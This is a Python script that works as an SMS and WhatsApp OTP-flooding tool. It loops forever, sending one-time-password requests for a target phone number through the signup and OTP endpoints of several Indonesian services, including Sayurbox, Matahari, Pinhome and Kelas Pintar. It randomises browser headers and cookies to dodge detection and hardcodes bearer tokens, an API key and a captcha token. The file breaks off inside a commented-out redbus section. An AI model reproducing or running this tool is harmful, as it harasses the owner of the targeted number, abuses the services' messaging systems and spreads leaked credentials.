import os, sys, time, json, requests
from colorama import Fore, init
from sys import argv
import random
import uuid

init(autoreset=True)

def autotype(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

inputNomer = argv[1]
nomor_matahari = inputNomer.replace("+62", "0")
nomor_mraladin = inputNomer.replace("+62", "")
nomor_pinhome = inputNomer.replace("+62", "")
nomor_saturdays = inputNomer.replace("+62", "")
nomor_redbus = inputNomer.replace("+62", "")
nomor_saturdays = inputNomer.replace("+62", "")
nomor_pinhome = inputNomer.replace("+62", "")
nomor_sobatbangun = inputNomer.replace("+62", "62")
nomor_nutriclub = inputNomer.replace("+62", "0")
# Loop to send OTP requests
while True:
    user_agent = generate_user_agent()
    # Sayurbox
    headers_sayurbox = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MjM1OTQ4LCJleHAiOjE3MjE4Mjc5NDgsImlhdCI6MTcxOTIzNTk0OCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.BWTgVDTwf0HPpEKb7yd3vNqvTYzoNmLlV-oAeCZqcxo7eYASpmWZtFsOQl_pNtPXeeWIob26X10pAA7-olFN3Pp3k9Pi-qC-qbL3TeC1vS80Xe5JEHyM7ParZmZJjPUtQD1FDjnHHcTGiS4Z4KmlzLuvAltedEUxv-YC-c8SjJSxRvWrgY6JqTu9Bn1qDRf08pD-3Bx3wZhVDgGNgGOYh65WrU1z-nLzYuYgwhgNPYv79qMUaUm2KD0IS30rNgRaYnKk7kleXxzgEPdYnbp-0DiFfuky7qtL9n4MSc86EvpYMNyf4HnggQqT2R3pOcwiN0xa_NQRz3id4xJ8ZJNBWA",
        "Content-Length": str(random.randint(100, 200)),
        "Content-Type": "application/json",
        "Cookie": "perf_dv6Tr4n=1; _gcl_au=1.1.453795563.1718975654; _ga=GA1.1.1863538960.1718975654; _fbp=fb.1.1718975655048.519782181988016639; afUserId=ce18733b-0c78-451f-9579-c6300baa97db-p; AF_SYNC=1718975655764; _sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MjM1OTQ4LCJleHAiOjE3MjE4Mjc5NDgsImlhdCI6MTcxOTIzNTk0OCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.BWTgVDTwf0HPpEKb7yd3vNqvTYzoNmLlV-oAeCZqcxo7eYASpmWZtFsOQl_pNtPXeeWIob26X10pAA7-olFN3Pp3k9Pi-qC-qbL3TeC1vS80Xe5JEHyM7ParZmZJjPUtQD1FDjnHHcTGiS4Z4KmlzLuvAltedEUxv-YC-c8SjJSxRvWrgY6JqTu9Bn1qDRf08pD-3Bx3wZhVDgGNgGOYh65WrU1z-nLzYuYgwhgNPYv79qMUaUm2KD0IS30rNgRaYnKk7kleXxzgEPdYnbp-0DiFfuky7qtL9n4MSc86EvpYMNyf4HnggQqT2R3pOcwiN0xa_NQRz3id4xJ8ZJNBWA; localSessionId=lk0uc8P05F_9Iagy1q7kK:1719235924953; localSessionIdExpire=1719235924953; _ga_RG03K1J7BE=GS1.1.1719235925.7.0.1719235925.0.0.0; _ga_MHTN2YH4H8=GS1.1.1719235925.7.1.1719235953.32.0.0",
        "Origin": "https://www.sayurbox.com",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": user_agent,
        "X-Binary-Version": "2.21.2",
        "X-Bundle-Revision": "60.4",
        "X-Device-Info": "{\"platform\":\"web\",\"is_app\":false,\"is_mobile\":false,\"device_type\":\"desktop\",\"device_id\":\"lk0uc8P05F_9Iagy1q7kK\",\"os_name\":\"Windows\",\"os_version\":\"NT 10.0\",\"brand\":null,\"model\":null,\"pixel_density\":1.125,\"client_ip\":\"::ffff:10.10.202.18\"}",
        "X-Sbox-Lang": "id",
        "X-Sbox-Tenant": "b2c",
        "X-Supported-Delivery": "NEXTDAY,SAMEDAY,INSTANT"
    }
    def send_whatsapp_request(phone_number):
        data_whatsapp_sayurbox = json.dumps({
            "operationName": "generateOTP",
            "variables": {
                "destinationType": "whatsapp",
                "identity": phone_number
            },
            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
        })
        response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox, timeout=5)
        if response_sayurbox_wa.status_code == 200:
            print(f"{hijau}Berhasil mengirim Whatsapp via SayurBox {response_sayurbox_wa.status_code}: {response_sayurbox_wa.text}")
        else:
            print(f"{R}Gagal mengirim Whatsapp via SayurBox {response_sayurbox_wa.status_code}: {response_sayurbox_wa.text}")

# Function to send SMS request
    def send_sms_request(phone_number):
        data_sms_sayurbox = json.dumps({
            "operationName": "generateOTP",
            "variables": {
                "destinationType": "sms",
                "identity": phone_number
            },
            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
        })
        response_sayurbox_sms = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_sms_sayurbox, timeout=5)
        if response_sayurbox_sms.status_code == 200:
            print(f"{hijau}Berhasil mengirim SMS via SayurBox {response_sayurbox_sms.status_code}: {response_sayurbox_sms.text}")
        else:
            print(f"{R}Gagal mengirim SMS via SayurBox {response_sayurbox_sms.status_code}: {response_sayurbox_sms.status_code}")
        
    send_sms_request(inputNomer)
    send_whatsapp_request(inputNomer)
    # Matahari
    headers_matahari = {
        "Host": "www.matahari.com",
        "content-length": str(random.randint(20, 50)), 
        "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
        "sec-ch-ua-mobile": "?1",
        "user-agent": user_agent,
        "content-type": "application/json",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": generate_sec_ch_ua_platform(),
        "origin": "https://www.matahari.com",
        "sec-fetch-site": random.choice(["same-site", "same-origin", "cross-site"]),
        "sec-fetch-mode": random.choice(["cors", "navigate", "no-cors"]),
        "sec-fetch-dest": random.choice(["empty", "document", "iframe"]),
        "referer": "https://www.matahari.com/customer/account/create/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": generate_accept_language()
    }
    data_matahari = json.dumps({
        "otp_request": {
            "mobile_number": nomor_matahari,
            "mobile_country_code": "+62",
            "token": "03AFcWeA6rBTK9XFGU4xi5A77pGBqHOhy74Vr6XW4ImA5P5nGi2rqtenZw7MwqMYv6ob_5aE4IjvAuFoboquHgpLHfAPwFGmVKEqBFJP31zKdlcQE95_AFEFpgrUmxNdboOADrHlHzJ98FePusoeEBP6GFedK-QoS7jjH6bygY38NdZ9mBlWqZzke13BN187QnP0kCiWDHPA5gspOHAA9N3zjxlsADcTqvabObXVZX6-2MjY_EZkZjNIc7B3LYQs5LTJHrFQOZKOKYeOO4EAXHBFGtUFzOVlAr7u2fp0obElm5PYyFKo71X_hlkM7zqG3ubwAy2RS8W5dUE5bHoaQ-8avw2Kozzykdcq8FMo0gIIIFEd7rM5wl689fAaUrohWNRwjONdeybL9YiapZ8oz81nXg6raaS7kYD07UQfjDv_xRw9XbpXwLxGLWoJDllawnbOm-TNKRREoy4qFZXQyh5k-xvMPWF2uReXsQlIZ7hlu_RjR8bSlc5WrA48nZDWS3A_K45nmUrihKw6FNG4WuaXEygNXv_gLl4GwloRKS1F_5SG6vKSYgXf2RqOrd_CO1f7T506fyvPtp9opDbZ9pjmHYdx583RvKrNVdnPYwu-qf69h53IKlpu7QlRH47RyAVJo0EExX9C9N4yRRQ8BSNCm8YAIpHgS8Yua21JeAvElQ6pV4nX_9aVjgwdcmU5sJKbAD9uvPUVk7ch5yqHmqQkPYeDoIMIre0ANhf6xqpd6PCVWmxqhEiHvMiK14E14inoxrjDpO7SSbimOCUJJGgAlZzp6XLOJLn1aJtyO34Cn4OWnm3UBKdHcBRUVAvQdRQ5NioV2yTv6hb2Qghc57_8rd4TDj8qniQuqWPPzzFnFkvdynEL1p9TVXJIuS0ZI20tIzGYqTZq4aissCsXXCsHzLBBVDkjdmZBRBbvR2Lv9jX6KavlBQ-X11dkBSPpYramyd24TglU4hiyYNipwmaw6lZlnTAxXkB3Av5ulh-Az39hG8fEOuoiQLnFRlpi_iH8nnooRqQNCsqyzRJ0SQ8cIsMcnsUDYvX9nzi5yccagMK6t-d5HL7353BCeFHSVWrKmcCJEEgacG3ka2-Aa9zj-MNJ6FAuioj0veQsqSpCw4Ug96bao3U3-M1VzG74NGrP9qul7kqhZ_A6htqiROsfgwSFYpviTTkGiqevRaKN3cuWlcPSdXqEyT72t-D07WHVzkmUJEtJ5sMUmYKPN2zCVog9manf757D1L0VC_bJnomu5_q9CEAW_g4b9dNnSCIiDWX4hw_ynMy1Qo37PYyb-1kkfQ9k2GTPGsdjc4bW53WdP4VkqbKuwdaIMCnSb8_hN-OyhUZJALXL0Hfc5gX_sC4d3aTKnrKp-Kp8u9_Gb4M0J7bDVPNiTEOO4v1iOtNJVD204DKhB0Ov3N5snWVLzAriErO48mAAU3la0xkeUEz53_CgCGCvZfDD8M8xV1uwsBkMvTcrv9smE4TLdB1u5q9kujmLfXOa9mIDlo2hxLbZsWjEwPWT4T23Ml7gecxrA6PEok3EAvJhyKm92bFZGLimRvXIc1TpTXMw4ZVpT_48ZBjCoN_W0joEL_AX0LDrp26X917_NtCyZyZiaYS05Qyd62oAK8oT0agNNs-HbjqgRMbYo_3RaxvDm2y3hn0zK2vfjoqECXncNSU5XDLjnvuf14KiCqaV4d3Y0znT_H_OgVeYo-usy25Nsw_ci58TWItD50VI9RZliM8FwtvglwMT36RFCCIdQzQcWsYGcYs-BQuDVYUDM"
        }
    })
    response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari, timeout=5)
    if response_matahari.status_code == 200:
        print(f"{hijau}Berhasil mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")

    headers_danacita = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(20, 50)), 
        "Content-Type": "application/json",
        "Cookie": generate_cookie(),
        "Origin": "https://app.danacita.co.id",
        "Referer": "https://app.danacita.co.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
	}
    
    data_danacita = json.dumps({
        "username": inputNomer,
	})
    
    
    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita, timeout=5)
    if response_danacita.status_code == 200:
        print(f"{hijau}Berhasil mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
        
    headers_misterAladin = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer null",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json;charset=UTF-8",
        "Cookie": "offer_id=103180; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; Lda_aKUr6BGRn=everydaysi.com/r/v2?; G_ENABLED_IDPS=google; Ac_aqK8DtrDL=1; Fm_kZf8ZQvmX=1; __cfruid=de4c77417ef8c7b1aab81ffb4fceadf9762578dc-1719067746; click_id=710414e9316844668c613db0eb3e8f7f; utm_medium=1637-710414e9316844668c613db0eb3e8f7f; _gat=1; _ga_PLKRYTK7YG=GS1.2.1719067732.2.1.1719067735.57.0.0",
        "Origin": "https://www.misteraladin.com",
        "Priority": "u=1, i",
        "Referer": "https://www.misteraladin.com/register",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Platform": "web"
	}
    
    data_misterAladin = json.dumps({
        "phone_number_country_code": "62",
        "phone_number": nomor_mraladin,
        "type": "register"
	})
    
    response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin, timeout=5)
    if response_mraladin.status_code == 200:
        print(f"{hijau}Berhasil mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")
    else: 
        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")

    #pinhome
    headers_pinhome = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Cookie": "_gcl_au=1.1.246269231.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _gcl_au=1.1.246269231.1718959212; _ga=GA1.1.127919491.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _ga_CYRVZ1HEXG=GS1.1.1718959211.1.0.1718959212.0.0.0; _hhcftd=1618a140204983c645ecd5c7e4f60381cdecf115; _clck=1iujwii%7C2%7Cfmv%7C0%7C1633; _clsk=hty05m%7C1719102661534%7C1%7C1%7Ch.clarity.ms%2Fcollect; ph_phc_vIu9D3s1qIMPGaAkpBsgyBhRUFKtuyS7qUqeo35W873_posthog=%7B%22distinct_id%22%3A%22019039f4-0639-73c4-bba9-8c71ae7a0b93%22%2C%22%24sesid%22%3A%5B1719102662482%2C%2201904280-df2e-7d49-b1ac-8ece3e8cb4fd%22%2C1719102660398%5D%7D; _gid=GA1.2.275863447.1719102663; _ga_Y1EHRSKVLJ=GS1.1.1719102663.1.0.1719102663.60.0.0; _ga=GA1.2.127919491.1718959212; _ga_CYRVZ1HEXG=GS1.1.1719102660.2.1.1719102667.0.0.0",
        "Origin": "https://www.pinhome.id",
        "Priority": "u=1, i",
        "Referer": "https://www.pinhome.id/daftar",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
    }
    
    data_pinhome = json.dumps({
        "accountType": "customers",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": nomor_pinhome
    })
    
    response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome, timeout=5)
    if response_pinhome.status_code == 201:
        print(f"{hijau}Berhasil mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
        
        
    headers_saturdays = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "undefined", 
        "Connection": "keep-alive",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Country-Code": "ID",
        "Currency-Code": "IDR",
        "Device-Type": "dweb",
        "Host": "beta.api.saturdays.com",
        "Origin": "https://saturdays.com",
        "Platform": "dweb",
        "Referer": "https://saturdays.com/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
    }

    data_saturdays = json.dumps({
        "number": nomor_saturdays,
        "countryCode": "+62",
        "type": "MSG"
    })
    
    response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays, timeout=5)
    if response_saturdays.status_code == 200:
        print(f"{hijau}Berhasil mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")
  
    headers_kelaspintar = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer undefined",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Origin": "https://www.kelaspintar.id",
        "Priority": "u=1, i",
        "Referer": "https://www.kelaspintar.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
    }
    
    data_kelaspintar = json.dumps({
        "phone_number": inputNomer,
    })
    
    response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar, timeout=5)
    if response_kelaspintar.status_code == 200:
        print(f"{hijau}Berhasil mengirim SMS/WA via Kelas Pintar {response_kelaspintar.status_code} {response_kelaspintar.text}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Kelas Pintar {response_kelaspintar.status_code} {response_kelaspintar.text}")
        
    # headers_redbus = {
    #     "Accept": "application/json, text/javascript, */*; q=0.01",
    #     "Accept-Encoding": "gzip, deflate, br, zstd",
    #     "Accept-Language": generate_accept_language(),
    #     "Content-Length": str(random.randint(20, 50)),
    #     "Content-Type": "application/json",
    #     "Cookie": "perf_dv6Tr4n=1; mriClientId=WD0f625f09-46a3-43dd-9622-428095c43159; GEOLS=Jakarta; GEOLC=Jakarta; GEOLCO=ID; GEORAD=20; bft=1; jfpj=42de6cd875dc35550a13d168939e1fd5; _ga=GA1.1.1141212957.1719150729; _gcl_au=1.1.273472393.1719150729; rb_fpData=%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22126.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C912%22%2C%22screenDPI%22%3A1.125%2C%22screenResolution%22%3A%221728x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%228%3A5%22%2C%22systemLanguage%22%3A%22en%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/126.0.0.0%20safari/537.36%7CWin32%7Cen%22%2C%22timeZone%22%3A7%7D; rskxRunCookie=0; rCookie=twii0beap3p2lv9da9pya3lxrlyhhf; country=IDN; currency=IDR; selectedCurrency=IDR; language=id; defaultlanguage=id; reqOrigin=SG; mriSessionId=WD7fcc1a2e-c7b8-44de-bf9c-c6baedda77cc; defaultCountry=IDN; deviceSessionId=b30dda51-7391-4e46-b823-02ae2b7bc9e5; lzFlag=1; moe_uuid=9057ed46-e13a-49ad-9013-5657634305ba; ak_bmsc=CD76B77185D0D3EE9B8FEF834C7C7ADE~000000000000000000000000000000~YAAQvuwZuKoKsDiQAQAA8Jt3RxiSDlck5LO9RwT5NJkRahj9qHwQfTyqG5x5NY7MmvwjeMXDkLIc8PR9TnLA+xPhxKTwVx4OTjMkzgyGC1sWsL7IUHgIzlKtuRhNCqj+xvhozA2C0urcMFVnVgsePANMCd+ke3eCNorIoTIPC15rEYfdraoTz4ybYMCsjXTlsI+K4a5Gb73BGQ8lDH9sF/YlEhoYSgGWAEZrPB5wTdBBW26ItRznRiu+/kg+9+L1uAaGDatPAR/AoLZB2nkWXEsfZhLIBiuhPT9516RTnZVDs7VsQ4CZBw6UT7BGRWQPfZMWe7MBHCl83nqh/x/xv7SSWDhK7aHWQ7OVNR5Rk/GrmzwaV2EXj4PcjvxCucteEqbUtrM+5f+Jnu9e6RWPp0lm+bGeO9uj4X2yfo95YuxNqu4DkJb3SDPhEHBgJ7rWT1kCS8ImUwR4; isBrowserFP=true; lastRskxRun=1719185915964; mriClientIdSetDate=Mon Jun 24 2024 06:47:46 GMT+0700 (Western Indonesia Time); bm_sv=3F9CE2C1559DB2C6AE4677D8A6A50039~YAAQvuwZuKyEsDiQAQAA+HGARxjQObU4Kep7EgrKuXizwQ75cSyDv8mTWWN+MFfjVC5439NoFmu8ojFQbERo4GVjHGv6f/zeAi9fBQs+cPVTjzZLtI+R8gmG/LuNaAVMzVbRE9xfsEmRBQDz5swjmmwzBgE5fuHbL9AH5+2eGSSixMZkcUzg6/Dc7fr19kDuWT2gr1pfG2bnZ5j/A+KFfFPZSQ/ABK+2AhLPlM3C7psrOxBfaB4ASNOnKKDZQgk=~1; _VTok=404977245971; _ga_1SE754V89Y=GS1.1.1719185914.3.1.1719186512.14.0.503742489",
    #     "Origin": "https://www.redbus.id",
    #     "Priority": "u=1, i",
    #     "Referer": "https://www.redbus.id/account?pageName=Home&noReload=noReload",
    #     "Sec-Ch-Ua": generate_sec_ch_ua(),
    #     "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
    #     "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
    #     "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
    #     "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
    #     "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
    #     "User-Agent": generate_user_agent(),
    #     "X-Requested-With": "XMLHttpRequest"
    # }
    
    # data_redbus = json.dumps({
    #     "mobileNo": nomor_redbus,
    #     "phoneCode": "62",
    #     "Source": "SIGNIN",
